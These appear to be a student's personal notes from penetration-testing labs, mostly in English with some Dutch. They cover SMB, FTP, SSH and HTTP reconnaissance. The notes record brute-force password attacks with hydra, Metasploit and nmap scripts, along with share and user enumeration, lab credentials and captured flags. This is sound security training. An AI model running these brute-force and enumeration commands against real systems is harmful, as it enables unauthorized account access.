1.  What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
   
		msf5 auxiliary(scanner/smb/smb_login) > run
		
		[] 192.57.201.3:445      - 192.57.201.3:445 - Starting SMB login bruteforce
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:admin',
		[!] 192.57.201.3:445      - No active DB -- Credential data will not be saved!
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:123456789',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:password',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:iloveyou',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:princess',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:1234567',
		[-] 192.57.201.3:445      - 192.57.201.3:445 - Failed: '.\jane:12345678',
		[+] 192.57.201.3:445      - 192.57.201.3:445 - Success: '.\jane:abc123'  📍
		[] 192.57.201.3:445      - Scanned 1 of 1 hosts (100% complete)
		[] Auxiliary module execution completed


   
2.  What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
		   
		root@attackdefense:~# gzip -d  /usr/share/wordlists/rockyou.txt.gz 
		root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.57.201.3 smb
		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
		
		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 10:10:24
		[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
		[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
		[DATA] attacking smb://192.57.201.3:445/
		[445][smb] host: 192.57.201.3   login: admin   password: password1
		1 of 1 target successfully completed, 1 valid password found
		Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-16 10:10:26

   
3.  Which share is read only? Use smbmap with credentials obtained in question 2.
		   
		   
		root@attackdefense:~# smbmap -H 192.57.201.3 -u admin -p password1
		[+] Finding open SMB ports....
		[+] User SMB session establishd on 192.57.201.3...
		[+] IP: 192.57.201.3:445        Name: target-1                                          
		        Disk                                                    Permissions
		        ----                                                    -----------
		        shawn                                                   READ, WRITE
		        nancy                                                   READ ONLY 📍
		        admin                                                   READ, WRITE
		        IPC$                                                    NO ACCESS



4.  Is share “jane” browseable? Use credentials obtained from the 1st question. Yes! 
   

		   root@attackdefense:~# smbclient -L 192.57.201.3 -U jane 
		Enter WORKGROUP\jane's password: abc123
		
		        Sharename       Type      Comment
		        ---------       ----      -------
		        shawn           Disk      
		        nancy           Disk      
		        admin           Disk      
		        IPC$            IPC       IPC Service (brute.samba.recon.lab)
		Reconnecting with SMB1 for workgroup listing.
		
		        Server               Comment
		        ---------            -------
		
		        Workgroup            Master
		        ---------            -------
		        RECONLABS            
	
   
   
   
5.  Fetch the flag from share “admin”
   

2727069bc058053bd561ce372721c92e
![[Pasted image 20230516122153.png]]
   
   
6.  List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
   
		   
		msf5 > use auxiliary/scanner/smb/pipe_auditor 
		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbuser admin
		smbuser => admin
		msf5 auxiliary(scanner/smb/pipe_auditor) > set smbpass password1
		smbpass => password1
		msf5 auxiliary(scanner/smb/pipe_auditor) > set rhosts 192.57.201.3
		rhosts => 192.57.201.3
		msf5 auxiliary(scanner/smb/pipe_auditor) > options
		
		Module options (auxiliary/scanner/smb/pipe_auditor):
		
		   Name         Current Setting                                                 Required  Description
		   ----         ---------------                                                 --------  -----------
		   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
		   RHOSTS       192.57.201.3                                                    yes       The target address range or CIDR identifier
		   SMBDomain    .                                                               no        The Windows domain to use for authentication
		   SMBPass      password1                                                       no        The password for the specified username
		   SMBUser      admin                                                           no        The username to authenticate as
		   THREADS      1                                                               yes       The number of concurrent threads
		
		msf5 auxiliary(scanner/smb/pipe_auditor) > run
		
		[+] 192.57.201.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
		[*] 192.57.201.3:         - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed




   
7.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.

`-R`: This option enables RID cycling, which means enum4linux will attempt to enumerate user SIDs by cycling through a range of RID values.

		S-1-22-1-1000 Unix User\shawn (Local User)
		S-1-22-1-1001 Unix User\jane (Local User)
		S-1-22-1-1002 Unix User\nancy (Local User)
		S-1-22-1-1003 Unix User\admin (Local User)


---- 

####  FTP 

- File transfer protocol 
- run nmap scan 
- hone in on open ftp port with opering scan and service scan: **nmap {target} -p 21 -sV -0** 
	- -   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.
	-   `-sV`: This option enables service/version detection. Nmap will attempt to determine the service running on the scanned port and provide information about the version of the service if possible.
	-   `-O`: This option enables operating system detection. Nmap will try to identify the operating system running on the target system by analyzing various network characteristics and responses.
- run: **hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}** 
	- -   `hydra`: This is the command to run Hydra, a popular online password cracking tool.
	-   `-L /usr/share/metasploit-framework/data/wordlist/common_users.txt`: This option specifies the path to the username wordlist file to be used during the brute-force attack. 
	-   `-P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt`: This option specifies the path to the password wordlist file to be used during the brute-force attack.
	-   `{service}`: Replace this with the specific service you want to target during the brute-force attack. Examples include `ssh`, `ftp`, `telnet`, etc.
- run: ftp {ip}  (use credentials from the results from the hydra scan)
- get {secret file}
	- exit ftp server with: bye 
	- cat file 
	  

- echo "sysadmin" > users 
- cat users 
Andere om ftp te bruteforcen strategy: 
- run folllowing command **nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 
	- -   `--script ftp-brute`: This option specifies that the FTP-brute script should be executed. The FTP-brute script is used to perform brute-force attacks against FTP services.
	-   `--script-args usersb=/root/users`: This option specifies the location of the username wordlist file to be used during the brute-force attack. In this case, the file is located at `/root/users`. Modify the path to the actual location of your username wordlist file.
	-   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.


----- LAB ----- 

target ip: 192.70.37.3 


**Questions**

1.  What is the version of FTP server?
   
		   root@attackdefense:~# nmap 192.70.37.3 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:08 UTC
		Nmap scan report for target-1 (192.70.37.3)
		Host is up (0.000010s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE
		21/tcp open  ftp    📍
		MAC Address: 02:42:C0:46:25:03 (Unknown)


		root@attackdefense:~# nmap 192.70.37.3 -p 21 -sV -O
	
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     ProFTPD 1.3.5a 📍
		MAC Address: 02:42:C0:46:25:03 (Unknown)
		Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
		Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
		No exact OS matches for host (test conditions non-ideal).
		Network Distance: 1 hop
		Service Info: OS: Unix

or nmap -sV 

   
2.  Use the username dictionary /usr/share/metasploit framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
   
		   root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.70.37.3 ftp
		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
		
		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 13:31:20
		[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
		[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
		[DATA] attacking ftp://192.70.37.3:21/
		[21][ftp] host: 192.70.37.3   login: sysadmin   password: 654321
		[21][ftp] host: 192.70.37.3   login: rooty   password: qwerty
		[21][ftp] host: 192.70.37.3   login: demo   password: butterfly
		[21][ftp] host: 192.70.37.3   login: auditor   password: chocolate
		[21][ftp] host: 192.70.37.3   login: anon   password: purple
		[21][ftp] host: 192.70.37.3   login: administrator   password: tweety
		[21][ftp] host: 192.70.37.3   login: diag   password: tigger
		   



3.  Find the password of user “sysadmin” using nmap script.
   
   
**nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 

	root@attackdefense:~# echo 'sysadmin' > users 
	root@attackdefense:~# cat users 
	sysadmin
	

	root@attackdefense:~# nmap 192.70.37.3 --script ftp-brute --script-args userdb=/root/users -p 21 
	Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:38 UTC
	Nmap scan report for target-1 (192.70.37.3)
	Host is up (0.000054s latency).
	
	PORT   STATE SERVICE
	21/tcp open  ftp
	| ftp-brute: 
	|   Accounts: 
	|     sysadmin:654321 - Valid credentials
	|_  Statistics: Performed 24 guesses in 5 seconds, average tps: 4.8
	MAC Address: 02:42:C0:46:25:03 (Unknown)
	   
4.  Find seven flags hidden on the server.

260ca9dd8a4577fc00b7bd5810298076   - login: sysadmin   password: 654321 
098f6bcd4621d373cade4e832627b4f6  -  login: auditor   password: chocolate

----

#### FTP Anonymous login 

- check open ports with nmap 
- do service scan on open port 
- run following command: nmap ip  -p 21 --script ftp-anon 
	- `--script ftp-anon`: This option instructs Nmap to execute the "ftp-anon" script. The "ftp-anon" script is used to check if anonymous (unauthenticated) FTP access is allowed on the target system. 
	- If anonymous login is possible then login with username: anonymous and no password 


LAB -- 

1.  Find the version of vsftpd server.
   
		   root@attackdefense:~# nmap 192.97.20.3 -sV
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:02 UTC
		Nmap scan report for target-1 (192.97.20.3)
		Host is up (0.0000090s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     vsftpd 3.0.3
		MAC Address: 02:42:C0:61:14:03 (Unknown)
		Service Info: OS: Unix


   
2.  Check whether anonymous login is allowed on the ftp server using nmap script.
   
		   root@attackdefense:~# nmap 192.97.20.3 -p21 --script ftp-anon
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:03 UTC
		Nmap scan report for target-1 (192.97.20.3)
		Host is up (0.000040s latency).
		
		PORT   STATE SERVICE
		21/tcp open  ftp
		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
		|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
		MAC Address: 02:42:C0:61:14:03 (Unknown)
   
   
   
   
3.  Fetch the flag from FTP server. 

![[Pasted image 20230516160454.png]]


### SSH

- Secure shell -> communicate with remote machine over protected channel 
- Stappenplan: 

1. Nmap scan on target ip 
2. Do service scan (get operating system info) on port 22: nmap ip -sV -O 
3. run: ssh root@ip and try to login with maybe abc123 
4. if permission denied try using netcat: nc ip port  (nc ip 22 ) this will give you the banner which is usefull for enumeration 
5. run: **nmap ip -p 22 --script ssh2-enum-algos** 
	 - The script is designed to enumerate and display the supported encryption algorithms, key exchange algorithms, and message authentication codes (MACs) supported by the SSH server running on the target host. It helps in identifying the security configuration of the SSH service.
	 - By running this command, you can gather information about the SSH encryption algorithms supported by the target host. This can be useful for assessing the security posture of SSH services and ensuring that strong encryption algorithms are being used.
	 - 
6. run: **nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full** 
	- `--script ssh-hostkey`: This option tells Nmap to use the `ssh-hostkey` script as part of the scan. The `ssh-hostkey` script is a built-in script in Nmap that retrieves and displays the SSH host key information for the target host.
	- It specifies the `full` option, which indicates that detailed information about the SSH host key should be retrieved.
7. check if there are any weak paswords for ssh:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student"** 
	- -   `--script ssh-auth-methods`: Dit geeft aan dat de Nmap-scripts met betrekking tot SSH-authenticatiemethoden moeten worden uitgevoerd. Deze scripts zullen proberen de ondersteunde authenticatiemethoden te identificeren die beschikbaar zijn op de SSH-server.
	-   `--script-args="ssh.user=student"`: Dit is een scriptargument dat wordt doorgegeven aan de Nmap-scripts. In dit geval wordt de argumentwaarde "student" gebruikt om aan te geven dat de scan moet worden uitgevoerd alsof de gebruiker "student" is. Dit kan nuttig zijn als de SSH-server verschillende authenticatiemethoden aanbiedt op basis van de gebruiker. met deze opdracht wordt een Nmap-scan uitgevoerd om de SSH-authenticatiemethoden te identificeren die beschikbaar zijn op het opgegeven doel-IP-adres, waarbij de scan wordt uitgevoerd alsof de gebruiker "student" is.
	- if the result is none than is dangerous 
8. check if there are any weak paswords for ssh for admin:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"** 

Since the student did not require any authentication we try: ssh student@ip > who am i > ipconfig > cat FLAG > logout 
![[Pasted image 20230517150117.png]]

---- LAB --- 

target ip: 192.60.141.3

sudo nmap -A -Pn 192.60.141.3

1.  What is the version of SSH server.
   
		   root@attackdefense:~#  nmap 192.60.141.3 -sV -O
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:06 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000039s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 📍
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

   
   
   
   
2.  Fetch the banner using netcat and check the version of SSH server.
	   
		   root@attackdefense:~# nc 192.60.141.3 22  
			SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
   
   
   
3.  Fetch pre-login SSH banner.
   
			   root@attackdefense:~# ssh root@192.60.141.3 
		The authenticity of host '192.60.141.3 (192.60.141.3)' can't be established.
		ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
		Are you sure you want to continue connecting (yes/no)? yes
		Warning: Permanently added '192.60.141.3' (ECDSA) to the list of known hosts.
		Welcome to attack defense ssh recon lab!!
		root@192.60.141.3's password: 
		Permission denied, please try again.
			   
   
   
   
4.  How many “encryption_algorithms” are supported by the SSH server. 27 
   
		   root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh2-enum-algos
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:11 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000030s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh2-enum-algos: 
		|   kex_algorithms: (6)
		|       curve25519-sha256@libssh.org
		|       ecdh-sha2-nistp256
		|       ecdh-sha2-nistp384
		|       ecdh-sha2-nistp521
		|       diffie-hellman-group-exchange-sha256
		|       diffie-hellman-group14-sha1
		|   server_host_key_algorithms: (5)
		|       ssh-rsa
		|       rsa-sha2-512
		|       rsa-sha2-256
		|       ecdsa-sha2-nistp256
		|       ssh-ed25519
		|   encryption_algorithms: (6)
		|       chacha20-poly1305@openssh.com
		|       aes128-ctr
		|       aes192-ctr
		|       aes256-ctr
		|       aes128-gcm@openssh.com
		|       aes256-gcm@openssh.com
		|   mac_algorithms: (10)
		|       umac-64-etm@openssh.com
		|       umac-128-etm@openssh.com
		|       hmac-sha2-256-etm@openssh.com
		|       hmac-sha2-512-etm@openssh.com
		|       hmac-sha1-etm@openssh.com
		|       umac-64@openssh.com
		|       umac-128@openssh.com
		|       hmac-sha2-256
		|       hmac-sha2-512
		|       hmac-sha1
		|   compression_algorithms: (2)
		|       none
		|_      zlib@openssh.com
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		   
   
   
5.  What is the ssh-rsa host key being used by the SSH server.
   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:13 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000045s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-hostkey: 
		|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD

   
   
6.  Which authentication method is being used by the SSH server for user “student”.
   
		   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"  
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000035s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-auth-methods: 
		|_  Supported authentication methods: none_auth
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
   
   
7.  Which authentication method is being used by the SSH server for user “admin”.
   
   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"  
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000044s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-auth-methods: 
		|   Supported authentication methods: 
		|     publickey
		|_    password
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		
		Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
   
   
8.  Fetch the flag from /home/student/FLAG by using nmap ssh-run script.

![[Pasted image 20230517161808.png]] 

or 

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" ip 
-  `--script=ssh-run`: This option specifies that the "ssh-run" script should be executed as part of the Nmap scan. The "ssh-run" script is a pre-defined script in Nmap that allows running custom commands on an SSH server.
-   `--script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password="`: This argument provides the arguments or parameters to the "ssh-run" script. It consists of three key-value pairs:
    -   `ssh-run.cmd=cat /home/student/FLAG`: This specifies the command to be executed on the SSH server. In this case, the command is `cat /home/student/FLAG`, which will read the contents of the "/home/student/FLAG" file on the remote SSH server.
    -   `ssh-run.username=student`: This sets the SSH username to "student". It specifies the username that will be used to authenticate with the SSH server during the scan.
    -   `ssh-run.password="`: This leaves the SSH password field empty. It means that no password is provided for authentication, and the script will attempt to connect to the SSH server using other authentication methods like public keys or other configured methods.


![[Pasted image 20230517162726.png]]


###  SSH Dictonary attack 

- nmap ip 
- nmap ip -sV -p 22 
- lets use the following wordlist: gzip -d /urs/share/wordlist/rockyou.txt.gz   
- use hydra for the wordlist: **hydra -l student -P /usr/share/wordlist/rockyou.txt ip ssh** 
- ssh student@ip (use password found with above command)
- lets check for admin: 
	- echo "adminsitrator" > user
		- e`cho "adminsitrator" > user`: This command creates a file named "user" and writes the string "administrator"  into it. This file will be used as a user database for the SSH brute force attack.
	- **nmap ip -p 22 --script ssh-brute --script-args userdb=/root/user** 
		- -   `--script ssh-brute`: It instructs Nmap to use the "ssh-brute" script, which is designed to perform a brute force attack against SSH servers.
		-   `--script-args userdb=/root/user`: This option provides the script argument "userdb" with the value "/root/user". It tells the "ssh-brute" script to use the specified file ("/root/user") as the user database for the brute force attack. The file should contain a list of usernames or user passwords that will be used during the attack.
- lets try the root password: 
	- msfconsole 
	- use auxiliary/scanner/ssh/ssh_login 
	- show options  ---> fix options ![[Pasted image 20230517165449.png]]
	- ssh root@ip 
	- fill in password found with metasploit 


--- Lab ---- 

target ip: 192.66.209.3 
		
		root@attackdefense:~# nmap 192.66.209.3 -sV -p 22
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6  
	

1.  Find the password of user “student” using hydra.
   
   
		root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.66.209.3 ssh
		[STATUS] 182.00 tries/min, 182 tries in 00:01h, 14344223 to do in 1313:35h, 16 active
		[22][ssh] host: 192.66.209.3   login: student   password: friend 📍
		1 of 1 target successfully completed, 1 valid password found
		   
   
2.  Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
   
	**root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user, passdb=/usr/share/nmap/nselib/data/passwords.lst 192.66.209.3** 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:36 UTC
		Unable to split netmask from target expression: "passdb=/usr/share/nmap/nselib/data/passwords.lst"
		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
		Nmap scan report for target-1 (192.66.209.3)
		Host is up (0.000049s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-brute: 
		|   Accounts: 
		|     administrator:sunshine - Valid credentials
		|_  Statistics: Performed 27 guesses in 5 seconds, average tps: 5.4
		MAC Address: 02:42:C0:42:D1:03 (Unknown)
		
		Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
		root@attackdefense:~# 


OF 

		root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user  192.66.209.3   
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:44 UTC
		NSE: [ssh-brute] Trying username/password pair: administrator:administrator
		NSE: [ssh-brute] Trying username/password pair: administrator:
		NSE: [ssh-brute] Trying username/password pair: administrator:michelle
		NSE: [ssh-brute] Trying username/password pair: administrator:tigger
		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
		NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
		Nmap scan report for target-1 (192.66.209.3)
		Host is up (0.000039s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-brute: 
		|   Accounts: 
		|     administrator:sunshine - Valid credentials
		|_  Statistics: Performed 28 guesses in 5 seconds, average tps: 5.6
		MAC Address: 02:42:C0:42:D1:03 (Unknown)


   
3.  Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
   
		   msf5 auxiliary(scanner/ssh/ssh_login) > run
		
		[-] 192.66.209.3:22 - Failed: 'root:'
		[!] No active DB -- Credential data will not be saved!
		[-] 192.66.209.3:22 - Failed: 'root:!root'
		[-] 192.66.209.3:22 - Failed: 'root:Cisco'
		[-] 192.66.209.3:22 - Failed: 'root:NeXT'
		[-] 192.66.209.3:22 - Failed: 'root:QNX'
		[-] 192.66.209.3:22 - Failed: 'root:admin'
		[+] 192.66.209.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
		[*] Command shell session 1 opened (192.66.209.2:44957 -> 192.66.209.3:22) at 2023-05-17 15:40:38 +0000
		[*] Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed


   ![[Pasted image 20230517174720.png]]
   
4.  What is the message of the day? (Printed after the user logs in to the SSH server).

	
		root@attackdefense:~# ssh root@192.66.209.3
		Ubuntu 16.04.5 LTS
		root@192.66.209.3's password: 
		Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		SSH recon dictionary attack lab

---


### HTTP 

- hosting website 
- run standard nmap 
- run extra nmap: nmap -sV -O 
	- when port 80 is open we check in our webbrowser is we can connect to the website 
- run: whatweb targetip 
	- By executing "whatweb targetip," you are instructing the tool to scan the specified IP address and provide information about the technologies, frameworks, content management systems (CMS), server software, and other relevant details associated with the target web server 
- run hhtpie: http target ip 
- run: dirb http://ip 
	- dirb will look for directories - first it will ook at toplevel directories then it will  go to subfolders 
- run: browsh --startup-url http:// 
  ![[Pasted image 20230606133353.png]]
  this will try to render the website if you do not have a browser 

-- Lab --- 
Nmap scan report for 10.2.24.249
Host is up (0.0025s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
**80/tcp   open  http          Microsoft IIS httpd 10.0**
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services

root@attackdefense:~# whatweb 10.2.24.249
Ignoring eventmachine-1.3.0.dev.1 because its extensions are not built. Try: gem pristine eventmachine --version 1.3.0.dev.1
Ignoring fxruby-1.6.29 because its extensions are not built. Try: gem pristine fxruby --version 1.6.29
http://10.2.24.249 [302 Found] ASP_NET[4.0.30319], Cookies[ASP.NET_SessionId,Server], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.2.24.249], Microsoft-IIS[10.0], RedirectLocation[/Default.aspx], Title[Object moved], X-Powered-By[ASP.NET], X-XSS-Protection[0]
http://10.2.24.249/Default.aspx [302 Found] ASP_NET[4.0.30319], Cookies[ASP.NET_SessionId,Server], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.2.24.249], Microsoft-IIS[10.0], RedirectLocation[/Default.aspx], Title[Object moved], X-Powered-By[ASP.NET], X-XSS-Protection[0]

Using the whatweb tool we found information about the running IIS Server as mentioned below.  
● IIS Server version is 10.0  
● ASP.NET Version is 4.0.30319  
● XSS Protection is 0  
● The default page of the target web application is /Default.aspx


oot@attackdefense:~# http 10.2.24.249
HTTP/1.1 302 Found
Cache-Control: private
Content-Length: 130
Content-Type: text/html; charset=utf-8
Date: Tue, 06 Jun 2023 11:39:56 GMT
Location: /Default.aspx
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=h01rqvfmvmcrfvzxssw2c0wb; path=/; HttpOnly; SameSite=Lax
Set-Cookie: Server=RE9UTkVUR09BVA==; path=/
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
X-XSS-Protection: 0

object moved to < href="/Default.aspx">


**Default.aspx is de default pagina als je de website bezoekt voor websites gebouwdt met microsoft aspx** 

### HTTP ISS Nmap script 

- run: nmap ip 
- run service scan: nmap ip -sV  and navigate to the website if port 80 is open 
- run the following to check services but also what directories there are: nmap: ip -sV -p 80 --script http-enum 
- run: nmap: ip -sV -p 80 --script http-headers 
- run: nmap: ip -sV -p 80 --script http-methods --script=args http-methods.url-path=/webdav/
- run this if you have a results for webdav using the above command: nmap: ip -sV -p 80 --script http-webdav-scan --script=args http-methods.url-path=/webdav/


-- lab -- 

- Identify IIS Server
  80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
  
- Get webserver header details

80/tcp open  http    Microsoft IIS httpd 10.0
| http-headers:                                                                          |
| -------------------------------------------------------------------------------------- |
| Cache-Control: private                                                                 |
| Content-Type: text/html; charset=utf-8                                                 |
**| Location: /Default.aspx                                                                |
| Server: Microsoft-IIS/10.0**                                                             |
| Set-Cookie: ASP.NET_SessionId=bjnf2tkiimxv3lwqoclojhle; path=/; HttpOnly; SameSite=Lax |
**| X-AspNet-Version: 4.0.30319**                                                            |
| Set-Cookie: Server=RE9UTkVUR09BVA = =; path=/                                            
**| X-XSS-Protection: 0                                                                    |
| X-Powered-By: ASP.NET**                                                                  |
| Date: Thu, 08 Jun 2023 09:02:38 GMT                                                    |
| Connection: close                                                                      
 Content-Length: 130                                                                    

  
- Enumerated HTTP methods
  
  ORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /content/: Potentially interesting folder
|   /downloads/: Potentially interesting folder
|_  /webdav/: Potentially interesting folder
|_http-server-header: Microsoft-IIS/10.0

  
  
- Detect WebDAV configuration - etc (check all allowed methods on webdav)

root@attackdefense:~# nmap 10.2.26.147 -sV -p 80 --script http-methods --script-args http-methods.url-path=/webdav/

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
